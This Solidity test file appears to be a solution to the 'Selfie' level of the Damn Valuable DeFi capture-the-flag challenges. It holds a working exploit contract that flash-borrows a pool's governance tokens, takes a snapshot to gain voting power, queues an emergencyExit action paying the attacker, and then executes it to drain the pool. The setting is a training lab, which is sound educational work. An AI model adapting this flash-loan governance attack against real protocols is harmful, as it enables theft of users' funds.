// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/DamnValuableTokenSnapshot.sol";
import "../../src/selfie/SimpleGovernance.sol";
import "../../src/selfie/SelfiePool.sol";
import "openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";

import "openzeppelin-contracts/utils/Address.sol";

contract Receiver is IERC3156FlashBorrower {
    using Address for address payable;
    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;
    address owner;
    uint256 public drainActionId;
    uint256 public flashLoanAmount;

    constructor(
        SimpleGovernance _governance,
        SelfiePool _pool,
        DamnValuableTokenSnapshot _token,
        uint256 _flashLoanAmount
    ) {
        owner = msg.sender;
        governance = _governance;
        pool = _pool;
        token = _token;
        flashLoanAmount = _flashLoanAmount;
    }

    function onFlashLoan(
        address lender,
        address token_,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "only pool");

        token.snapshot();

        drainActionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", owner)
        );

        // transfer back funds
        token.approve(address(pool), flashLoanAmount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        require(msg.sender == owner, "only owner");
        pool.flashLoan(
            IERC3156FlashBorrower(this),
            address(token),
            flashLoanAmount,
            ""
        );
    }
}

contract SelfieTest is BaseTest {
    uint256 TOKEN_INITIAL_SUPPLY = 3000000 ether; // 2 million tokens
    uint256 TOKENS_IN_POOL = 1500001 ether; // 1.5 million tokens

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;

    address attacker;

    constructor() {
        string[] memory labels = new string[](1);
        labels[0] = "Attacker";

        preSetup(1, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        // setup contracts
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(token), "DamnValuableTokenSnapshot");

        governance = new SimpleGovernance(address(token));
        vm.label(address(governance), "SimpleGovernance");

        pool = new SelfiePool(address(token), address(governance));
        vm.label(address(pool), "SelfiePool");

        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
    }

    function test_ExploitSelfieTest() public {
        runTest();
    }

    function exploit() internal override {
        // DVToken SnapshotERC20 allows everyone to make a snapshot whenever he wants.
        // Governance should be really stricted.

        uint256 amount = token.balanceOf(address(pool));
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(attacker);
        Receiver receiver = new Receiver(governance, pool, token, amount);
        receiver.attack();
        vm.stopPrank();

        // warp time to be able to execute the drain action
        utils.mineTime(governance.getActionDelay());
        governance.executeAction(receiver.drainActionId());
    }

    function success() internal override {
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), 0);
    }
}
